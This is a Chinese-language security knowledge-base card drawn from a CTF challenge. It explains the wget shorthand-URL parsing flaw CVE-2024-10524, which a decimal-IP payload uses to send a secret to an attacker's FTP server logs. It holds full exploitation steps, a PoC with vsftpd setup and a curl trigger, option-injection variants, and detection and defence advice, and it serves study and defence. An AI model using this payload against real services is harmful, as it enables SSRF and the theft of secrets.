---
id: web-generic-ssrf-wget-shorthand-ftp-decimal-ip-secret-path-exfil
title: wget 简写解析把「参数@主机:端口」当成 ftp://host/path，用十进制 IP 绕过点号黑名单把 URL 里的秘密外带到自建 FTP 日志
type: scenario
domain: web
path: web/generic/ssrf
technique: wget-ftp-shorthand-argument-injection-decimal-ip-exfil
tags:
- ssrf
- wget
- command-injection
- ftp
- blacklist-bypass
- exfiltration
- cve-2024-10524
cve:
- CVE-2024-10524
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:35:26+08:00'
  notes: 已对照原文核对（HITCTF2024 wget 题）：单参数 subprocess.run 拼接、黑名单含点号与斜杠、payload 2130706433:kkkkk、vsftpd log_ftp_protocol 取回 flag、预建 kkkkk@127.0.0.1:5000 目录均与正文一致；本次核对未读取图片，仅依据正文；CVE-2024-10524 来自原文标题，原文未给受影响版本区间故未填 affected_versions
url: /docs/web/generic/ssrf/web-generic-ssrf-wget-shorthand-ftp-decimal-ip-secret-path-exfil/
draft: false
kb_aliases:
- CVE-2024-10524
- wget 简写漏洞
- wget ftp:// 简写注入
- 十进制 IP 绕过点号黑名单
- 单参数 wget SSRF 外带
---

## 一句话结论

应用把用户输入拼进 wget 的**单个参数**（`wget <输入>@127.0.0.1:5000/<秘密>`），即使做了 `subprocess.run(list)` 这种不经 shell 的调用、还过滤了 `. / ; ' " \` 等字符，只要漏了 `:`，攻击者提交 `2130706433:kkkkk` 就会让 wget 把整串按「简写 URL」解析成 `ftp://2130706433/kkkkk@127.0.0.1:5000/<秘密>`，请求直接打到攻击者的 FTP 服务器，秘密作为 FTP 路径写进对方日志。

## 原理

- **简写解析规则**：wget 对不含 scheme 的参数会尝试猜协议。参数中如果第一个 `:` 出现在 `@` 之前，wget 会把 `a:b@c` 解释为 `ftp://a/b@c`：冒号前的部分当主机名，冒号后的整体当 FTP 路径（其中 `b@c` 只是一段路径名，不是 userinfo）。这是 CVE-2024-10524 描述的解析缺陷：用户以为 `user:pass@host` 会被当凭据，实际被当成了主机 + 路径。
- **为什么能跳出原来的 127.0.0.1**：原命令里硬编码的 `@127.0.0.1:5000/<秘密>` 只有在「整串被当作一个 URL 的主机+端口+路径」时才指向靶机自身。一旦 wget 按简写把它折成 `ftp://<攻击者主机>/<路径>`，`@127.0.0.1:5000` 与随后的 `<秘密>` 全部退化为主机名之后的**路径**，连接目标变成攻击者控制的主机。
- **为什么秘密会外泄**：secret（本例是 flag 的 base64）本来就拼在 URL 尾部，改写后它落在 FTP 请求路径里。vsftpd 打开 `log_ftp_protocol=YES` 后会把客户端请求的完整路径写进日志，因此攻击者无需任何回显通道就能读到秘密。
- **为什么用十进制 IP**：黑名单把 `.` 也过滤了，普通点分 IP 无法输入；而 `inet_aton`/`getaddrinfo` 接受 `2130706433` 这样的 32 位十进制整数（也可用 `0x7f000001`、八进制），既绕过了点号限制又能精确指向某台主机。
- **为什么单参数调用也挡不住**：这个缺陷发生在 wget 自身的 URL 解析阶段，与 shell 元字符无关，所以 `subprocess.run(["wget", arg])`、`execve` 直调都照样中招。

## 触发条件

- 应用把用户可控字符串拼接进 wget 的参数（尤其是作为 URL 的 userinfo 或前缀部分）。
- 黑名单/校验没有拦住 `:`（以及可选的 `@`），典型是「过滤了 shell 元字符就以为安全」。
- 靶机允许出网（能用 FTP/TCP 连到攻击者），或至少 DNS 可达。
- 受保护的秘密被拼进同一个 URL 里（路径、查询串、userinfo），否则只能做纯 SSRF 探测。

## 利用步骤

1. 起一台可被靶机访问的主机，装 vsftpd，开匿名访问并把 `anon_root` 指到自己可控目录，同时打开 `log_ftp_protocol=YES`、`dual_log_enable=YES`，日志落到本地文件；确认从本机能匿名登录。
2. 把攻击机 IP 换成十进制形式（例如 `127.0.0.1` → `2130706433`），以便在禁 `.` 的输入框里仍然可写。
3. 若 wget 会先为路径建目录/因 5xx 提前中断，在 FTP 根目录下预先创建与 `<kkkkk>@127.0.0.1:5000` 对应的目录，保证 wget 把路径完整发出去。
4. 向目标接口提交 `auth=2130706433:kkkkk`（字段名按目标而定），使最终参数变成 `2130706433:kkkkk@127.0.0.1:5000/<秘密>`。
5. 在攻击机 `tail -f` FTP 日志，从 `RETR`/路径字段里读回秘密的 base64，解码得到明文。

## PoC

```bash
# 1) 攻击机：匿名 FTP + 协议日志
# /etc/vsftpd.conf 关键项
anonymous_enable=YES
anon_root=/srv/ftp
no_anon_password=YES
log_ftp_protocol=YES
dual_log_enable=YES
vsftpd_log_file=/var/log/vsftpd.log
# 预建目录，避免 wget 因路径不存在提前放弃
mkdir -p '/srv/ftp/kkkkk@127.0.0.1:5000'
sudo systemctl restart vsftpd

# 2) 十进制主机 + 冒号，绕过禁 `.` 的黑名单
# 目标最终执行的是（单参数，不经 shell）：
#   wget "2130706433:kkkkk@127.0.0.1:5000/<base64 secret>"
# wget 实际解析为：
#   ftp://2130706433/kkkkk@127.0.0.1:5000/<base64 secret>

# 3) 触发并取回
curl -s -X POST http://TARGET:5000/execute \
     --data-urlencode 'auth=2130706433:kkkkk'
sudo tail -n 20 /var/log/vsftpd.log   # 日志里出现完整路径 → base64 秘密
```

## 变体与关联

- **其他 wget 参数位**：同样的思路可用于把 `--post-file`、`--header`、`-O` 之类选项塞进参数前缀（需能控制参数开头并以空白/选项形式进入），或利用 `--` 缺失把用户输入当选项解析。
- **其他主机写法**：`0x7f000001`、八进制 `0177.0.0.1`、IPv6 字面量都能绕过不同的字符黑名单。
- **与 gopher/dict 的区别**：本卡利用的是 wget 自己的 URL 简写解析，不需要 shell 元字符、也不需要跟随跳转；若目标用的是 curl 且允许跟随重定向，则走「302 → gopher」的那条路（见同目录重定向进 gopher 的卡）。
- **纯探测用法**：把秘密换成任意字符串时，本链退化为「无回显 SSRF + 出网确认」，可用 FTP/DNS 日志判断主机是否能出网。

## 检测与防御

- 不要用「过滤 shell 元字符」代替校验：对拼进 URL 的部分做严格白名单（如 `^[A-Za-z0-9_-]+$`），并在参数前加 `--` 终止选项解析。
- 避免把秘密拼进命令行的 URL；改用独立参数、POST 体或 HTTP 头传递，避免随 URL 落进对方日志。
- 升级 wget 到修复 CVE-2024-10524 的版本，并复核所有把用户输入交给 `wget`/`curl` 的调用点。
- 出网侧限制：只允许访问必要上游，禁止直连任意公网主机与 FTP（21/20 及被动端口段）；监控 wget 子进程访问非常规 FTP/公网 IP 的行为。
- 检测：命令行里出现「十进制/十六进制 IP + 冒号」组合、`ftp://` 请求、以及在 CGI/脚本上下文里由 Web 进程派生 wget 的网络连接。
